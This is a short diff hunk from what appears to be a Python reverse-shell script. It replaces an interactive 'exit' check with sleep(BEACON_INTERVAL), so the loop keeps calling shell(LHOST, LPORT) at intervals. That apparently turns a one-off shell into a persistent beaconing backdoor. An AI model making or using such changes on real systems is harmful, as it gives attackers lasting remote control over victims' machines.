@@ -35,5 +35,4 @@ def shell(lhost, lport):
 
 while True:
     shell(LHOST, LPORT)
-    if input() == "exit":
-        break
+    sleep(BEACON_INTERVAL)
